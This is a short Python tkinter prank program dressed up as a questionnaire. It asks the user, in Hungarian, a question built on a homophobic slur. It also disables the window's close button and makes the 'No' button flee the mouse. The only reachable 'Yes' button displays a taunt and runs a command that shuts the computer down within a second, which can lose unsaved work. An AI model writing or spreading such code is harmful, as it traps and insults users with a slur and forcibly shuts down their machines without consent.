from tkinter import *
from tkinter import messagebox
import random
import os

def no():
    messagebox.showinfo(' ', 'Tudtam, hogy az vagy.')
    return os.system("shutdown /s /t 1")

def motionMouse(event):
    btnYes.place(x=random.randint(0, 500), y=random.randint(0, 500))

def disable_close_button():
    pass

root = Tk()
root.geometry("600x600")
root.title("Kérdőív")
root.resizable(width=False, height=False)
root.protocol("WM_DELETE_WINDOW", disable_close_button)
Label = Label(root, text="Buzi vagy?", font="Arial 20 bold").pack()
btnYes = Button(root, text="Nem", font="Arial 20 bold")
btnYes.place(x=170, y=100)
btnYes.bind('<Enter>', motionMouse)
btnNo = Button(root, text="Igen", font="Arial 20 bold", command=no).place(x=350, y=100)

root.mainloop()